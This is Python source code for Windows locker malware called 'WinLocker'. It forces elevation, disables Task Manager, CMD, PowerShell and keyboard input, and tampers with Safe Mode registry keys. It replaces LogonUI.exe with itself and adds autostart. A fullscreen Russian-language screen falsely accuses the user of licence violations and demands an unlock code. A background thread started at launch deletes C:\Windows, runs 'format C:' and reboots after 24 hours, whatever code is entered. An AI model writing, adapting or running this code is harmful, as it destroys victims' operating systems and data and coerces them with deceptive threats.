import sys
import os
import ctypes
import win32con
import win32gui
import win32api
import win32security
import subprocess
import time
import threading
import shutil
import tempfile
from ctypes import wintypes
from tkinter import *
from tkinter import ttk
import tkinter as tk

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def request_admin():
    while not is_admin():
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            sys.exit()
        except:
            time.sleep(1)
            continue

request_admin()

def block_keys():
    try:
        ctypes.windll.user32.BlockInput(True)
    except:
        pass

def unblock_keys():
    try:
        ctypes.windll.user32.BlockInput(False)
    except:
        pass

def disable_task_manager():
    try:
        subprocess.run(
            ["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
             "/v", "DisableTaskMgr", "/t", "REG_DWORD", "/d", "1", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
    except:
        pass

def enable_task_manager():
    try:
        subprocess.run(
            ["reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
             "/v", "DisableTaskMgr", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
    except:
        pass

def disable_cmd_powershell():
    try:
        subprocess.run(
            ["reg", "add", "HKCU\\Software\\Policies\\Microsoft\\Windows\\System",
             "/v", "DisableCMD", "/t", "REG_DWORD", "/d", "2", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        subprocess.run(
            ["reg", "add", "HKCU\\Software\\Policies\\Microsoft\\PowerShell",
             "/v", "Enable", "/t", "REG_DWORD", "/d", "0", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
    except:
        pass

def enable_cmd_powershell():
    try:
        subprocess.run(
            ["reg", "delete", "HKCU\\Software\\Policies\\Microsoft\\Windows\\System",
             "/v", "DisableCMD", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        subprocess.run(
            ["reg", "delete", "HKCU\\Software\\Policies\\Microsoft\\PowerShell",
             "/v", "Enable", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
    except:
        pass

def hijack_logonui():
    try:
        logonui_path = "C:\\Windows\\System32\\LogonUI.exe"
        backup_path = "C:\\Windows\\System32\\LogonUI_backup.exe"
        
        if not os.path.exists(backup_path):
            try:
                os.rename(logonui_path, backup_path)
            except:
                pass
        
        shutil.copy(sys.argv[0], logonui_path)
        
        subprocess.run(
            ["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
             "/v", "Shell", "/t", "REG_SZ", "/d", "LogonUI.exe", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
    except:
        pass

def restore_logonui():
    try:
        logonui_path = "C:\\Windows\\System32\\LogonUI.exe"
        backup_path = "C:\\Windows\\System32\\LogonUI_backup.exe"
        
        if os.path.exists(backup_path):
            try:
                os.remove(logonui_path)
                os.rename(backup_path, logonui_path)
            except:
                pass
    except:
        pass

def block_safe_mode():
    try:
        subprocess.run(
            ["reg", "add", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal",
             "/v", "WinLocker", "/t", "REG_SZ", "/d", "Service", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        subprocess.run(
            ["reg", "add", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network",
             "/v", "WinLocker", "/t", "REG_SZ", "/d", "Service", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        subprocess.run(
            ["reg", "add", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot",
             "/v", "AlternateShell", "/t", "REG_SZ", "/d", "cmd.exe", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
    except:
        pass

def restore_safe_mode():
    try:
        subprocess.run(
            ["reg", "delete", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal",
             "/v", "WinLocker", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        subprocess.run(
            ["reg", "delete", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network",
             "/v", "WinLocker", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
    except:
        pass

def add_autostart():
    try:
        subprocess.run(
            ["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
             "/v", "WinLocker", "/t", "REG_SZ", "/d", sys.argv[0], "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
    except:
        pass

def remove_autostart():
    try:
        subprocess.run(
            ["reg", "delete", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
             "/v", "WinLocker", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
    except:
        pass

def delete_windows():
    time.sleep(86400)
    try:
        subprocess.run(["takeown", "/f", "C:\\Windows", "/r", "/d", "y"], 
                      capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(["icacls", "C:\\Windows", "/grant", "Administrator:F", "/t"], 
                      capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(["cmd", "/c", "rd /s /q C:\\Windows"], 
                      shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(["cmd", "/c", "format C: /q /y"], 
                      shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(["shutdown", "/r", "/t", "0"], 
                      capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass
    sys.exit()

class WinLocker:
    def __init__(self):
        disable_task_manager()
        disable_cmd_powershell()
        block_safe_mode()
        hijack_logonui()
        add_autostart()
        block_keys()
        
        self.root = tk.Tk()
        self.root.title("Windows Заблокирован")
        self.root.geometry("900x650")
        self.root.configure(bg='#1a1a1a')
        self.root.attributes('-alpha', 0.92)
        self.root.attributes('-fullscreen', True)
        self.root.overrideredirect(True)
        self.root.lift()
        self.root.focus_force()
        self.root.attributes('-topmost', True)
        
        self.root.bind_all("<Control-Key>", lambda e: "break")
        self.root.bind_all("<Alt-Key>", lambda e: "break")
        self.root.bind_all("<Escape>", lambda e: "break")
        self.root.bind_all("<F1>", lambda e: "break")
        self.root.bind_all("<F4>", lambda e: "break")
        self.root.bind_all("<Windows>", lambda e: "break")
        self.root.bind_all("<Key>", lambda e: "break")
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        self.password = ""
        self.correct = "19499393"
        self.remaining = 86400
        self.timer_id = None
        self.warning_shown = False
        
        self.build_ui()
        self.update_timer()
        self.root.mainloop()
    
    def build_ui(self):
        main_frame = Frame(self.root, bg='#1a1a1a', highlightbackground='#ff0000', highlightthickness=4)
        main_frame.pack(expand=True, fill=BOTH, padx=50, pady=50)
        
        title_frame = Frame(main_frame, bg='#1a1a1a', highlightbackground='#ff3333', highlightthickness=3)
        title_frame.pack(pady=25, padx=30, fill=X)
        
        title = Label(title_frame, text="WINDOWS ЗАБЛОКИРОВАН", 
                     font=('Segoe UI', 32, 'bold'), fg='#ff0000', bg='#1a1a1a')
        title.pack(pady=20)
        
        text_frame = Frame(main_frame, bg='#1a1a1a', highlightbackground='#666666', highlightthickness=2)
        text_frame.pack(pady=20, padx=30, fill=BOTH, expand=True)
        
        message = """ВАША СИСТЕМА WINDOWS БЫЛА ЗАБЛОКИРОВАНА ПО СЛЕДУЮЩИМ ПРИЧИНАМ:

- Обнаружено использование нелицензионного программного обеспечения
- Зафиксирована работа читов и взломщиков игр
- Нарушение лицензионного соглашения Microsoft (EULA)
- Несанкционированный доступ к системным файлам Windows
- Попытка обхода механизмов безопасности

ДЛЯ РАЗБЛОКИРОВКИ СИСТЕМЫ ВВЕДИТЕ КОД ДОСТУПА.

ВНИМАНИЕ: При вводе неверного кода система будет уничтожена через 24 часа.
Все данные на диске C: будут безвозвратно удалены.

ОСТАЛОСЬ ВРЕМЕНИ ДО УНИЧТОЖЕНИЯ:"""
        
        msg_label = Label(text_frame, text=message, font=('Segoe UI', 12), 
                         fg='#cccccc', bg='#1a1a1a', justify=LEFT)
        msg_label.pack(pady=25, padx=25, anchor=W)
        
        self.timer_label = Label(text_frame, text="24:00:00", font=('Segoe UI', 28, 'bold'),
                                 fg='#ff0000', bg='#1a1a1a')
        self.timer_label.pack(pady=15)
        
        pass_frame = Frame(main_frame, bg='#1a1a1a', highlightbackground='#ff3333', highlightthickness=3)
        pass_frame.pack(pady=20, padx=30, fill=X)
        
        self.pass_entry = Entry(pass_frame, font=('Segoe UI', 20), bg='#2d2d2d', 
                                fg='white', justify=CENTER, state='readonly',
                                readonlybackground='#2d2d2d', width=20)
        self.pass_entry.pack(pady=15, padx=15)
        self.update_pass_display()
        
        btn_frame = Frame(main_frame, bg='#1a1a1a')
        btn_frame.pack(pady=15)
        
        buttons = [
            ('1', 0, 0), ('2', 0, 1), ('3', 0, 2),
            ('4', 1, 0), ('5', 1, 1), ('6', 1, 2),
            ('7', 2, 0), ('8', 2, 1), ('9', 2, 2),
            ('⌫', 3, 0), ('0', 3, 1), ('OK', 3, 2)
        ]
        
        for (text, row, col) in buttons:
            if text == '⌫':
                bg = '#4a0000'
                fg = '#ff6666'
            elif text == 'OK':
                bg = '#004a00'
                fg = '#66ff66'
            else:
                bg = '#2d2d2d'
                fg = 'white'
            
            btn = Button(btn_frame, text=text, font=('Segoe UI', 18, 'bold'),
                        bg=bg, fg=fg, width=8, height=2,
                        highlightbackground='#555555', highlightthickness=2,
                        relief=RAISED, bd=4,
                        command=lambda t=text: self.on_keypress(t))
            btn.grid(row=row, column=col, padx=6, pady=6)
        
        clear_btn = Button(main_frame, text="ОЧИСТИТЬ", font=('Segoe UI', 14, 'bold'),
                          bg='#4a0000', fg='#ff6666', height=2,
                          highlightbackground='#ff0000', highlightthickness=3,
                          relief=RAISED, bd=4,
                          command=self.clear_password)
        clear_btn.pack(pady=15, padx=30, fill=X)
    
    def on_keypress(self, char):
        if char == 'OK':
            self.check_password()
        elif char == '⌫':
            self.password = self.password[:-1]
            self.update_pass_display()
        else:
            if len(self.password) < 20:
                self.password += char
                self.update_pass_display()
    
    def update_pass_display(self):
        display = '•' * len(self.password)
        self.pass_entry.config(state='normal')
        self.pass_entry.delete(0, END)
        self.pass_entry.insert(0, display)
        self.pass_entry.config(state='readonly')
    
    def clear_password(self):
        self.password = ""
        self.update_pass_display()
        self.pass_entry.config(readonlybackground='#2d2d2d')
    
    def check_password(self):
        if self.password == self.correct:
            self.unlock_system()
        else:
            self.password = ""
            self.update_pass_display()
            self.pass_entry.config(readonlybackground='#4a0000')
            self.root.after(300, lambda: self.pass_entry.config(readonlybackground='#2d2d2d'))
            
            if not self.warning_shown:
                self.warning_shown = True
                self.show_warning()
    
    def show_warning(self):
        warn = Toplevel(self.root)
        warn.title("ПРЕДУПРЕЖДЕНИЕ")
        warn.geometry("500x200")
        warn.configure(bg='#1a1a1a')
        warn.attributes('-topmost', True)
        warn.resizable(False, False)
        
        Label(warn, text="НЕВЕРНЫЙ КОД ДОСТУПА", 
              font=('Segoe UI', 18, 'bold'), fg='#ff0000', bg='#1a1a1a').pack(pady=20)
        Label(warn, text="Осталось всего 3 попытки!\nПосле этого система будет уничтожена немедленно.",
              font=('Segoe UI', 12), fg='#ff6666', bg='#1a1a1a').pack(pady=10)
        Button(warn, text="ПОНЯЛ", font=('Segoe UI', 12), bg='#2d2d2d', fg='white',
               command=warn.destroy, width=15, height=2).pack(pady=20)
    
    def unlock_system(self):
        unblock_keys()
        enable_task_manager()
        enable_cmd_powershell()
        restore_safe_mode()
        restore_logonui()
        remove_autostart()
        
        self.root.destroy()
        
        subprocess.run(["shutdown", "/r", "/t", "2"], 
                      capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        sys.exit()
    
    def update_timer(self):
        if self.remaining <= 0:
            delete_windows()
            return
        
        hours = self.remaining // 3600
        minutes = (self.remaining % 3600) // 60
        seconds = self.remaining % 60
        self.timer_label.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        self.remaining -= 1
        self.timer_id = self.root.after(1000, self.update_timer)

if __name__ == "__main__":
    threading.Thread(target=delete_windows, daemon=True).start()
    app = WinLocker()
